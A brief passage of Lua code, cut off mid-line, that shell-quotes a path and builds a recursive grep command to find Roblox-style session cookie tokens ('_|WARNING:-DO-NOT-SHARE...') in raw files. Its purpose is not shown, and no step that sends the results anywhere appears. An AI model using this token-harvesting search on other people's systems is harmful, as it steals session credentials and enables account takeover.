    local quoted = "'" .. base:gsub("'", "'\\''") .. "'"
    -- Token shape: _|WARNING:-DO-NOT-SHARE-THIS.--...-items.|_<base64-ish session>
    local out = shellOut("grep -a -r -h -o -E '_[|]WARNING:-DO-NOT-SHARE[A-Za-z.-]*[|]_[A-Za-z0-9+/=_-]{20,}' --exclude='*.bak-*' "
